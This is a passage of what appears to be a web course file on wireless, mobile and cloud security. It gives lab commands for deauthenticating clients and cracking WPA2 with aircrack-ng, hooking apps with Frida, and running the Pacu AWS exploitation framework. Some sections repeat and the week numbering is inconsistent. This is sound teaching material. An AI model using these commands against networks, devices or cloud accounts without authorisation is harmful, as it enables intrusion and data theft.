                    <li><strong>Wireless Recon with Kismet:</strong></li>
                    <ul class="list-disc pl-6 mb-4">
                        <li>Use Kismet to scan for nearby wireless networks.</li>
                        <li>Document the details of the detected networks, including encryption type (WEP, WPA, WPA2), SSID broadcast status, and the number of connected clients.</li>
                    </ul>
                </ul>
                
                
            `},
            {
                title: ' Wireless Network Security - Assignments and Additional Reading',
                content: `
                    <h5 class="font-bold pl-6 mb-4">Lab 2: Cracking WPA2 with Aircrack-ng</h5>
                <p class="pl-6 mb-4">In this lab, you will use Aircrack-ng to capture a WPA2 handshake and perform a dictionary attack to crack the password.</p>
                
                <p class="pl-6 mb-4"><strong>Steps:</strong></p>
                <ol class="list-decimal pl-6 mb-4">
                    <li><strong>Monitor the Network:</strong></li>
                    <p class="pl-6 mb-4">Use airodump-ng to capture packets on a specific channel.</p>
                    <pre class="pl-6 mb-4"><code>airodump-ng --channel &lt;CH&gt; --bssid &lt;BSSID&gt; -w capture wlan0</code></pre>
                    
                    <li><strong>Capture Handshake:</strong></li>
                    <p class="pl-6 mb-4">Perform a deauthentication attack to force a client to reconnect, capturing the handshake.</p>
                    <pre class="pl-6 mb-4"><code>aireplay-ng --deauth 10 -a &lt;BSSID&gt; -c &lt;Client_MAC&gt; wlan0</code></pre>
                    
                    <li><strong>Crack the WPA2 Key:</strong></li>
                    <p class="pl-6 mb-4">Use a dictionary attack with Aircrack-ng to crack the captured handshake.</p>
                    <pre class="pl-6 mb-4"><code>aircrack-ng -w /path/to/wordlist capture-01.cap</code></pre>
                </ol>
                
                <h5 class="font-bold pl-6 mb-4">Practical Activity:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>WPA2 Key Cracking:</strong></li>
                    <ul class="list-disc pl-6 mb-4">
                        <li>Perform the entire process of capturing a WPA2 handshake and cracking the key using Aircrack-ng.</li>
                        <li>Write a report on how the strength of the password affects the success and time required for the attack.</li>
                    </ul>
                </ul>    
                <h4 class="font-bold">Assignment for Week 15:</h4>
                    
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Wireless Network Recon:</strong> Use Kismet to perform wireless reconnaissance on your local area. Document the types of encryption used and any potential vulnerabilities you identify.</li>
                        <li><strong>WPA2 Cracking:</strong> Set up a WPA2 wireless network and use Aircrack-ng to crack the password. Write a report detailing the steps taken and the time required to crack the password based on its strength.</li>
                    </ul>
                    
                    <h4 class="font-bold">Additional Reading:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Book:</strong> <em>"Hacking Exposed Wireless: Wireless Security Secrets & Solutions"</em> by Johnny Cache — A comprehensive guide to wireless network security, including detailed attack and defense techniques.</li>
                        <li><strong>Blog:</strong> <em>"Aircrack-ng Documentation"</em> — The official documentation for the Aircrack-ng suite, with step-by-step guides on cracking WEP, WPA, and WPA2.</li>
                    </ul>
                    
                    <h4 class="font-bold">Next Week Preview:</h4>
                    <p class="pl-6 mb-4">Next week, we will focus on <strong>Mobile Security</strong>, where we’ll analyze mobile OS security models for iOS and Android, explore common mobile application vulnerabilities, and perform hands-on labs for static and dynamic analysis of mobile apps.</p>
                `},
                {
                    title: 'Week 2: Mobile Security',
                    content: `
                        <p class="pl-6 mb-4"><strong>Part 1: Mobile Security</strong></p>
                        <p class="pl-6 mb-4">In this module, we explore the world of Mobile Security, focusing on the security models of popular mobile operating systems (Android and iOS), techniques for analyzing mobile applications (static and dynamic analysis), and common vulnerabilities like insecure data storage and weak cryptography. The increasing use of mobile applications for sensitive tasks such as banking, healthcare, and business makes securing mobile platforms a critical area in cybersecurity. We will also examine real-world case studies of significant mobile security breaches.</p>
                        
                        <p class="pl-6 mb-4"><strong>Topics Covered:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Mobile OS security models: Android vs. iOS.</li>
                            <li>Analyzing mobile applications: Static and dynamic analysis.</li>
                            <li>Exploiting mobile applications: Insecure data storage, weak cryptography.</li>
                            <li>Case studies of real-world mobile security breaches.</li>
                        </ul>
                        
                        <p class="pl-6 mb-4"><strong>1. Mobile OS Security Models: Android vs. iOS</strong></p>
                        <p class="pl-6 mb-4">Both Android and iOS implement security mechanisms to protect users from malicious applications, data breaches, and exploitation. Understanding how these security models work is key to assessing and exploiting vulnerabilities in mobile applications.</p>
                        
                        <p class="pl-6 mb-4"><strong>1. Android Security Model</strong></p>
                        <p class="pl-6 mb-4">Android is an open-source mobile operating system with a wide range of devices and manufacturers. Its security model is built around the following key components:</p>
                        
                        <p class="pl-6 mb-4"><strong>Key Security Features:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Application Sandbox:</strong> Each Android app runs in its own isolated sandbox using the Linux user-based isolation model. Apps cannot access each other’s data or system resources without explicit permission.</li>
                            <li><strong>Permissions System:</strong> Apps must request specific permissions (e.g., access to camera, location, storage) from the user. These permissions are either declared at install-time (pre-Android 6.0) or requested at runtime (post-Android 6.0).</li>
                            <li><strong>Google Play Protect:</strong> A built-in malware scanning feature that checks apps in the Play Store and on devices for malicious behavior.</li>
                            <li><strong>Verified Boot:</strong> Ensures that the device boots using a trusted version of Android, protecting against tampered firmware or kernel-level attacks.</li>
                            <li><strong>SEAndroid:</strong> An implementation of SELinux (Security-Enhanced Linux) in Android that enforces mandatory access control policies to prevent unauthorized access.</li>
                        </ul>
                        
                        <p class="pl-6 mb-4"><strong>Android Weaknesses:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Fragmentation:</strong> The open-source nature of Android and the involvement of multiple manufacturers lead to inconsistent security patching across devices.</li>
                            <li><strong>Side-Loading:</strong> Android allows the installation of apps from third-party sources, which increases the risk of installing malicious apps.</li>
                        </ul>
                    `},
                {
                    title: 'iOS Security Model & Mobile Application Analysis',
                    content: `
                        <p class="pl-6 mb-4"><strong>2. iOS Security Model</strong></p>
                        <p class="pl-6 mb-4">iOS is a closed-source operating system used by Apple devices. Its security model is tightly controlled by Apple, with a focus on user privacy, secure app distribution, and hardware-based security features.</p>
                        
                        <p class="pl-6 mb-4"><strong>Key Security Features:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>App Sandbox:</strong> Similar to Android, iOS apps run in a sandbox that isolates them from accessing other apps’ data. Apps can only access resources explicitly granted to them.</li>
                            <li><strong>Code Signing:</strong> All apps on iOS must be signed with a valid Apple Developer certificate, ensuring that only authorized apps can run on iOS devices.</li>
                            <li><strong>App Store Review:</strong> Apple’s App Store has a rigorous review process, where apps are checked for security vulnerabilities and malicious behavior before being published.</li>
                            <li><strong>Data Protection:</strong> iOS provides hardware encryption for all user data, and it requires passcodes or biometrics to decrypt sensitive information.</li>
                            <li><strong>Secure Enclave:</strong> A dedicated hardware component that handles sensitive operations like Touch ID, Face ID, and key management in a secure environment.</li>
                        </ul>
                        
                        <p class="pl-6 mb-4"><strong>iOS Weaknesses:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Jailbreaking:</strong> Users can “jailbreak” their iPhones, bypassing iOS security mechanisms to install unauthorized apps or tweak system-level settings. This opens up the device to security risks.</li>
                        </ul>
                        
                        <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Android vs. iOS Security Analysis:</strong>
                                <ol class="list-decimal pl-6 mb-4">
                                    <li>Compare the security models of Android and iOS, focusing on sandboxing, permission models, and app distribution security.</li>
                                    <li>Identify potential attack vectors unique to each operating system (e.g., side-loading in Android, jailbreaking in iOS).</li>
                                </ol>
                            </li>
                        </ul>
                        
                        <p class="pl-6 mb-4"><strong>2. Analyzing Mobile Applications: Static and Dynamic Analysis</strong></p>
                        <p class="pl-6 mb-4">Mobile application security testing involves both static (code-level) and dynamic (runtime) analysis. These techniques are crucial for discovering vulnerabilities in mobile applications, such as insecure data storage, weak authentication, and improper implementation of cryptographic functions.</p>
            
                    `},
                        {
                            title: '',
                            content:`
                            <p class="pl-6 mb-4"><strong>1. Static Analysis of Mobile Applications</strong></p>
                            <p class="pl-6 mb-4">Static analysis involves analyzing the code or binaries of the application without executing it. This helps identify potential vulnerabilities in the app's structure, such as hardcoded credentials, insecure APIs, and poor encryption practices.</p>
                            
                            <p class="pl-6 mb-4"><strong>Tools for Static Analysis:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Android:</strong> Use APKTool to decompile Android apps and inspect the code for potential security issues.</li>
                                <pre class="pl-6 mb-4"><code>apktool d MyApp.apk</code></pre>
                                <li><strong>iOS:</strong> Use Class-Dump or Objection to analyze the binary of an iOS app.</li>
                                <pre class="pl-6 mb-4"><code>class-dump MyApp.ipa</code></pre>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Static Analysis of an Android App:</strong>
                                    <ol class="list-decimal pl-6 mb-4">
                                        <li>Use APKTool to decompile an APK file and review the decompiled code for hardcoded credentials, API keys, or insecure API calls.</li>
                                        <li>Identify any manifest file weaknesses (e.g., overly permissive permissions, exported activities).</li>
                                    </ol>
                                </li>
                            </ul>
                            <p class="pl-6 mb-4"><strong>2. Analyzing Mobile Applications: Static and Dynamic Analysis</strong></p>
                            <p class="pl-6 mb-4">Mobile application security testing involves both static (code-level) and dynamic (runtime) analysis. These techniques are crucial for discovering vulnerabilities in mobile applications, such as insecure data storage, weak authentication, and improper implementation of cryptographic functions.</p>
                            
                            <p class="pl-6 mb-4"><strong>1. Static Analysis of Mobile Applications</strong></p>
                            <p class="pl-6 mb-4">Static analysis involves analyzing the code or binaries of the application without executing it. This helps identify potential vulnerabilities in the app's structure, such as hardcoded credentials, insecure APIs, and poor encryption practices.</p>
                            
                            <p class="pl-6 mb-4"><strong>Tools for Static Analysis:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Android:</strong> Use APKTool to decompile Android apps and inspect the code for potential security issues.</li>
                                <pre class="pl-6 mb-4"><code>apktool d MyApp.apk</code></pre>
                                <li><strong>iOS:</strong> Use Class-Dump or Objection to analyze the binary of an iOS app.</li>
                                <pre class="pl-6 mb-4"><code>class-dump MyApp.ipa</code></pre>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Static Analysis of an Android App:</strong>
                                    <ol class="list-decimal pl-6 mb-4">
                                        <li>Use APKTool to decompile an APK file and review the decompiled code for hardcoded credentials, API keys, or insecure API calls.</li>
                                        <li>Identify any manifest file weaknesses (e.g., overly permissive permissions, exported activities).</li>
                                    </ol>
                                </li>
                            </ul>
                            `},
                {
                    title: 'Dynamic Analysis & Exploiting Mobile Applications',
                    content: `
                        <p class="pl-6 mb-4"><strong>2. Dynamic Analysis of Mobile Applications</strong></p>
                        <p class="pl-6 mb-4">Dynamic analysis involves running the mobile application in a controlled environment and monitoring its behavior, network traffic, and system interactions. This helps discover runtime vulnerabilities like insecure data transmission or improper session management.</p>
                        
                        <p class="pl-6 mb-4"><strong>Tools for Dynamic Analysis:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Android:</strong> Use Frida or Xposed Framework for runtime analysis, API hooking, and method interception.</li>
                            <pre class="pl-6 mb-4"><code>frida -U -f com.myapp -l myscript.js --no-pause</code></pre>
                            <li><strong>iOS:</strong> Use Objection or Frida to perform dynamic analysis and runtime manipulation.</li>
                            <pre class="pl-6 mb-4"><code>objection -g com.myapp explore</code></pre>
                        </ul>
                        
                        <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Dynamic Analysis of a Mobile App:</strong>
                                <ol class="list-decimal pl-6 mb-4">
                                    <li>Set up an Android Emulator or a Jailbroken iPhone and install a target app.</li>
                                    <li>Use Frida to hook into the app’s API and monitor data sent over the network, focusing on how sensitive information (e.g., user credentials) is transmitted.</li>
                                </ol>
                            </li>
                        </ul>
                        
                        <p class="pl-6 mb-4"><strong>3. Exploiting Mobile Applications: Insecure Data Storage, Weak Cryptography</strong></p>
                        
                        <p class="pl-6 mb-4"><strong>1. Insecure Data Storage</strong></p>
                        <p class="pl-6 mb-4">Many mobile apps store sensitive information (e.g., passwords, session tokens, personal data) insecurely in plaintext or in unprotected areas of the file system. Attackers with physical access to the device or access to backups can retrieve this sensitive data.</p>
                        
                        <p class="pl-6 mb-4"><strong>Common Storage Issues:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Storing Sensitive Data in Plaintext:</strong> Storing passwords, API tokens, or session data in plaintext files or shared preferences.</li>
                            <li><strong>Insecure External Storage:</strong> Storing sensitive data on external storage (e.g., SD cards) where it can be accessed by other apps.</li>
                        </ul>
                        
                        <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Exploiting Insecure Data Storage:</strong>
                                <ol class="list-decimal pl-6 mb-4">
                                    <li>Analyze a mobile app that stores data on the device (e.g., in shared preferences or SQLite databases).</li>
                                    <li>Use adb (for Android) or iFunBox (for iOS) to extract files from the app and inspect them for sensitive information.</li>
                                </ol>
                            </li>
                        </ul>
                    `},
                {
                    title: 'Weak Cryptography & Real-World Mobile Security Breaches',
                    content: `
                        <p class="pl-6 mb-4"><strong>2. Weak Cryptography</strong></p>
                        <p class="pl-6 mb-4">Many mobile apps use weak or improperly implemented cryptography, leaving sensitive data exposed. This can include the use of outdated algorithms (e.g., MD5, SHA1) or hardcoded encryption keys.</p>
                        
                        <p class="pl-6 mb-4"><strong>Common Cryptographic Issues:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Hardcoded Keys:</strong> Storing encryption keys directly in the application code.</li>
                            <li><strong>Use of Insecure Algorithms:</strong> Using weak hashing or encryption algorithms like MD5 or DES.</li>
                            <li><strong>Lack of Key Management:</strong> Not using secure key management systems (e.g., Android’s Keystore or iOS’s Secure Enclave).</li>
                        </ul>
                        
                        <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Exploiting Weak Cryptography:</strong>
                                <ol class="list-decimal pl-6 mb-4">
                                    <li>Decompile a target app and search for hardcoded encryption keys or insecure cryptographic implementations.</li>
                                    <li>Use tools like Rubeus or Crackstation to crack weak hashes or reverse weak encryption.</li>
                                </ol>
                            </li>
                        </ul>
                        
                        <p class="pl-6 mb-4"><strong>4. Case Studies of Real-World Mobile Security Breaches</strong></p>
                        <p class="pl-6 mb-4">Studying real-world breaches helps understand how mobile security failures can lead to significant data leaks, privacy violations, and financial losses.</p>
                        
                        <p class="pl-6 mb-4"><strong>1. WhatsApp Pegasus Spyware Attack (2019)</strong></p>
                        <p class="pl-6 mb-4"><strong>Attack Overview:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Pegasus spyware was deployed through a vulnerability in WhatsApp’s voice call feature. Attackers could install spyware on the victim’s phone by making a WhatsApp call, even if the victim did not answer.</li>
                            <li>The spyware exploited a vulnerability in the WebRTC protocol and allowed attackers to access all of the victim’s messages, calls, and data.</li>
                        </ul>
                        <p class="pl-6 mb-4"><strong>Lesson Learned:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Ensure timely updates and patches for mobile applications to fix critical vulnerabilities.</li>
                            <li>Use end-to-end encryption for sensitive communications, but monitor the security of external components like WebRTC.</li>
                        </ul>
                        
                        <p class="pl-6 mb-4"><strong>2. Uber Data Leak (2016)</strong></p>
                        <p class="pl-6 mb-4"><strong>Attack Overview:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Uber experienced a massive data breach when attackers gained access to AWS S3 buckets storing sensitive customer and driver information. The attackers found hardcoded AWS credentials in Uber’s GitHub repository.</li>
                            <li>The breach exposed personal data of over 57 million users, including names, email addresses, and phone numbers.</li>
                        </ul>
                        <p class="pl-6 mb-4"><strong>Lesson Learned:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Avoid hardcoding sensitive credentials (e.g., API keys, database passwords) in the application code.</li>
                            <li>Implement secure key management practices and use environment variables or secret management tools like AWS Secrets Manager.</li>
                        </ul>
                    `},
                {
                    title: 'Snapchat API Exploitation & Week 16 Assignments',
                    content: `
                        <p class="pl-6 mb-4"><strong>3. Snapchat Mobile API Exploitation (2014)</strong></p>
                        <p class="pl-6 mb-4"><strong>Attack Overview:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Attackers exploited Snapchat’s unprotected API, allowing them to scrape user data and automate actions on behalf of users. A lack of proper authentication and authorization controls exposed user information.</li>
                            <li>Over 4.6 million Snapchat usernames and phone numbers were leaked online.</li>
                        </ul>
                        <p class="pl-6 mb-4"><strong>Lesson Learned:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Always implement strong authentication and authorization controls for APIs used by mobile applications.</li>
                            <li>Use rate limiting and input validation to prevent abuse of APIs.</li>
                        </ul>

                        <p class="pl-6 mb-4"><strong>Assignment for Week 16:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Mobile App Static and Dynamic Analysis:</strong> Select a mobile app (Android or iOS) and perform both static and dynamic analysis using tools like APKTool, Frida, or Objection. Write a report detailing any security vulnerabilities discovered.</li>
                            <li><strong>Exploiting Insecure Data Storage:</strong> Identify a mobile app that stores sensitive information locally (e.g., user credentials, API keys). Extract and analyze the stored data to determine whether it is encrypted or stored in plaintext.</li>
                            <li><strong>Case Study Report:</strong> Choose a real-world mobile security breach (e.g., Uber, WhatsApp), analyze how the breach occurred, and propose mitigation strategies that could have prevented it.</li>
                        </ul>

                        <p class="pl-6 mb-4"><strong>Additional Reading:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Book:</strong> "Android Hacker's Handbook" by Joshua J. Drake — A detailed guide to Android hacking, including exploitation techniques and security testing methodologies.</li>
                            <li><strong>OWASP Mobile Security Testing Guide:</strong> A comprehensive resource for testing the security of mobile applications.</li>
                            <li><strong>iOS Security Whitepaper:</strong> Published by Apple, this document explains the iOS security architecture and features.</li>
                        </ul>

                        <p class="pl-6 mb-4"><strong>Next Week Preview:</strong></p>
                        <p class="pl-6 mb-4">Next week, we will begin <strong>Cloud Security</strong>, where we will explore the security of cloud environments like AWS, Azure, and GCP, focusing on misconfigurations, securing APIs, and hands-on labs for cloud penetration testing.</p>
                    `}
                ],
                videoUrl: '',
                commands: [],
                content: ''
                },
                {
                id: "module-9",
                title: 'Module 7 - Cloud Security ',
                icon: Shield,
                sections: [
                    {
                        title: 'Week 1: Cloud Architecture and Threats',
                        content: `
                            <p class="pl-6 mb-4"><strong>Part 1: Cloud Architecture and Threats</strong></p>
                            <p class="pl-6 mb-4">In this module, we will explore the foundational aspects of cloud security. Understanding the architecture of cloud computing and the unique threats posed to cloud environments is essential for securing cloud infrastructures and applications. We will focus on cloud computing models such as IaaS, PaaS, and SaaS, common cloud security threats (like misconfigurations, data breaches, and account hijacking), and techniques for penetration testing in cloud environments. Hands-on labs will involve exploiting cloud misconfigurations in platforms like AWS, Azure, and Google Cloud Platform (GCP).</p>
                
                            <p class="pl-6 mb-4"><strong>Topics Covered:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Understanding cloud computing models: IaaS, PaaS, SaaS.</li>
                                <li>Common cloud security threats: Misconfigurations, Data Breaches, Account Hijacking.</li>
                                <li>Penetration testing in the cloud: AWS, Azure, GCP.</li>
                                <li>Hands-on labs: Exploiting cloud misconfigurations.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>1. Understanding Cloud Computing Models: IaaS, PaaS, SaaS</strong></p>
                            <p class="pl-6 mb-4">Cloud computing models offer various levels of control, flexibility, and security responsibilities. Knowing the differences between these models is key to understanding cloud security risks and responsibilities.</p>
                
                            <p class="pl-6 mb-4"><strong>1. Infrastructure as a Service (IaaS)</strong></p>
                            <p class="pl-6 mb-4">In IaaS, cloud providers offer virtualized computing resources like servers, storage, and networking infrastructure. Users manage their own operating systems, applications, and data but rely on the provider to secure the physical hardware and hypervisor.</p>
                            
                            <p class="pl-6 mb-4"><strong>Example Providers:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Amazon Web Services (AWS):</strong> Elastic Compute Cloud (EC2), Elastic Block Store (EBS).</li>
                                <li><strong>Microsoft Azure:</strong> Virtual Machines (VMs), Virtual Networks (VNet).</li>
                                <li><strong>Google Cloud Platform (GCP):</strong> Compute Engine, Persistent Disks.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Security Considerations:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Shared Responsibility Model:</strong> Cloud provider is responsible for securing the infrastructure, while the user is responsible for securing the data, applications, and OS.</li>
                                <li><strong>Vulnerabilities:</strong> Misconfigured access controls, weak network security policies, insecure API keys.</li>
                            </ul>
                        `},
                {
                    title: 'Part 2: Cloud Architecture and Threats - Continued',
                    content: `
                        <p class="pl-6 mb-4"><strong>2. Platform as a Service (PaaS)</strong></p>
                        <p class="pl-6 mb-4">In PaaS, cloud providers manage the underlying infrastructure, including OS, middleware, and runtime, allowing developers to focus on building and deploying applications without worrying about managing servers.</p>
            
                        <p class="pl-6 mb-4"><strong>Example Providers:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>AWS Elastic Beanstalk.</li>
                            <li>Azure App Services.</li>
                            <li>Google App Engine.</li>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>Security Considerations:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Data Security:</strong> Ensure that sensitive data is encrypted both in transit and at rest.</li>
                            <li><strong>Misconfigurations:</strong> Insecure default settings or improper access controls on APIs or databases can lead to breaches.</li>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>3. Software as a Service (SaaS)</strong></p>
                        <p class="pl-6 mb-4">In SaaS, users access fully managed applications through the internet, such as email, customer relationship management (CRM), or office productivity suites.</p>
            
                        <p class="pl-6 mb-4"><strong>Example Providers:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Gmail (Google).</li>
                            <li>Office 365 (Microsoft).</li>
                            <li>Salesforce CRM.</li>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>Security Considerations:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Data Privacy:</strong> Sensitive data may be stored and processed by third parties, raising privacy and compliance issues.</li>
                            <li><strong>Access Controls:</strong> Improper identity and access management (IAM) settings can expose sensitive data to unauthorized users.</li>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Cloud Computing Model Analysis:</strong></li>
                            <li>Research and document the security responsibilities in the shared responsibility model for IaaS, PaaS, and SaaS.</li>
                            <li>Compare the security risks associated with each model, focusing on data protection, user roles, and provider responsibilities.</li>
                        </ul>
                    `},
                {
                    title: 'Part 3: Common Cloud Security Threats',
                    content: `
                        <p class="pl-6 mb-4"><strong>2. Common Cloud Security Threats</strong></p>
                        <p class="pl-6 mb-4">Cloud environments introduce new security threats, often stemming from misconfigurations, lack of visibility, and insufficient monitoring. We’ll cover some of the most prevalent threats to cloud security.</p>
                        
                        <p class="pl-6 mb-4"><strong>1. Misconfigurations</strong></p>
                        <p class="pl-6 mb-4">Misconfigurations in cloud services are one of the leading causes of security incidents. Cloud platforms offer extensive features and permissions, but without proper configuration, these features can expose sensitive data and systems.</p>
                        
                        <p class="pl-6 mb-4"><strong>Common Misconfigurations:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Publicly Accessible S3 Buckets: Sensitive data stored in AWS S3 buckets is accidentally made public due to improper access control settings.</li>
                            <li>Open Databases: Cloud databases (e.g., RDS, Cosmos DB) are exposed to the public internet due to lack of access restrictions.</li>
                            <li>Insecure API Keys: API keys or credentials are left in code repositories, allowing attackers to access cloud services.</li>
                        </ul>
                        
                        <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Misconfiguration Exercise:</strong></li>
                            <li>Set up an S3 bucket with insecure permissions and simulate the consequences of accidentally exposing sensitive data (e.g., logging into the bucket and retrieving files).</li>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>2. Data Breaches</strong></p>
                        <p class="pl-6 mb-4">In a cloud environment, data breaches can occur due to weak encryption, improper access controls, or insufficient data isolation between tenants in multi-tenant environments.</p>
            
                        <p class="pl-6 mb-4"><strong>Causes of Cloud Data Breaches:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Insecure APIs: Public APIs that are not properly authenticated and authorized can expose sensitive data.</li>
                            <li>Weak Encryption: Failure to encrypt sensitive data at rest or in transit can lead to data theft in the event of a breach.</li>
                        </ul>
            
                        
                    `},
                    {
                        title: '',
                        content:`
                        <p class="pl-6 mb-4"><strong>Example:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Capital One Data Breach (2019):</strong> A misconfigured AWS Web Application Firewall (WAF) allowed an attacker to access sensitive customer data from an S3 bucket.</li>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>3. Account Hijacking</strong></p>
                        <p class="pl-6 mb-4">Account hijacking in cloud environments occurs when attackers gain unauthorized access to cloud management accounts, allowing them to manipulate cloud resources, steal data, or deploy malicious infrastructure.</p>
            
                        <p class="pl-6 mb-4"><strong>Common Account Hijacking Techniques:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Credential Stuffing: Attackers use previously leaked credentials from other services to gain access to cloud management accounts.</li>
                            <li>Weak IAM Policies: Improperly configured Identity and Access Management (IAM) policies can grant attackers excessive privileges.</li>
                            <li>Phishing: Attackers trick users into disclosing credentials through phishing emails or fake login pages.</li>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Simulated Account Hijacking:</strong></li>
                            <li>Set up an IAM account with weak policies in AWS and use an attacker’s perspective to simulate an account hijacking scenario, where privileges are escalated to access sensitive resources.</li>
                        </ul>`
                    },
                    {
                        title: 'Part 3: Penetration Testing in the Cloud: AWS, Azure, GCP',
                        content: `
                            <p class="pl-6 mb-4"><strong>3. Penetration Testing in the Cloud: AWS, Azure, GCP</strong></p>
                            <p class="pl-6 mb-4">Penetration testing in cloud environments requires knowledge of cloud-specific architectures and tools. Cloud providers often operate under a shared responsibility model, meaning pen testers must focus on customer-controlled aspects of the environment (e.g., applications, configurations, data, and user permissions).</p>
                            
                            <p class="pl-6 mb-4"><strong>1. Penetration Testing in AWS</strong></p>
                            <p class="pl-6 mb-4">Amazon Web Services (AWS) is one of the most popular cloud platforms, and many companies rely on it to host applications, store data, and manage infrastructure. Penetration testing in AWS often focuses on misconfigurations, weak IAM policies, and insecure access to services like S3, RDS, and Lambda.</p>
                            
                            <p class="pl-6 mb-4"><strong>Common AWS Targets:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>S3 Buckets: Check for insecure permissions, public access, and data exposure.</li>
                                <li>IAM Policies: Review IAM roles and policies for over-privileged users or services.</li>
                                <li>EC2 Instances: Evaluate the security of virtual machines, including SSH access, outdated software, and exposed services.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>AWS Penetration Testing Tools:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Pacu:</strong> An open-source AWS exploitation framework designed for security testing and postexploitation in AWS environments.</li>
                            </ul>
                            <pre class="pl-6 ">git clone https://github.com/RhinoSecurityLabs/pacu</pre>
                            <pre class="pl-6">cd pacu</pre>
                            <pre class="pl-6 mb-4">python3 pacu.py</pre>
                            
                            
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>ScoutSuite:</strong> A multi-cloud auditing tool that identifies misconfigurations and security risks in AWS, Azure, and GCP.</li>
                            </ul>
                            <pre class="pl-6 mb-4">scout --provider aws</pre>
                
                            
                        `},
                {
                    title: '',
                    content:`
                    <p class="pl-6 mb-4"><strong>2. Penetration Testing in Azure</strong></p>
                    <p class="pl-6 mb-4">Microsoft Azure provides IaaS, PaaS, and SaaS solutions, making it a diverse target for security testing. Azure security assessments focus on storage services (e.g., Blob Storage, Cosmos DB), access controls, and VM security.</p>

                    <p class="pl-6 mb-4"><strong>Common Azure Targets:</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li>Blob Storage: Check for insecure access control lists (ACLs) that allow public access to sensitive data.</li>
                        <li>Virtual Machines: Assess VMs for outdated software, weak credentials, and exposed services.</li>
                        <li>Azure AD: Evaluate the security of Azure Active Directory, particularly for misconfigurations in authentication and authorization.</li>
                    </ul>

                    <p class="pl-6 mb-4"><strong>Azure Penetration Testing Tools:</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Azucar:</strong> A tool for scanning and gathering security-related information from Azure subscriptions, focusing on misconfigurations and insecure settings.</li>
                    </ul>
                    <pre class="pl-6">azucar.py -s</pre>
                    `},
                {
                    title: 'Part 4: Penetration Testing in Azure and GCP',
                    content: `
                        <p class="pl-6 mb-4"><strong>2. Penetration Testing in Azure</strong></p>
                        <p class="pl-6 mb-4">Microsoft Azure provides IaaS, PaaS, and SaaS solutions, making it a diverse target for security testing. Azure security assessments focus on storage services (e.g., Blob Storage, Cosmos DB), access controls, and VM security.</p>
            
                        <p class="pl-6 mb-4"><strong>Common Azure Targets:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Blob Storage: Check for insecure access control lists (ACLs) that allow public access to sensitive data.</li>
                            <li>Virtual Machines: Assess VMs for outdated software, weak credentials, and exposed services.</li>
                            <li>Azure AD: Evaluate the security of Azure Active Directory, particularly for misconfigurations in authentication and authorization.</li>
                        </ul>
            
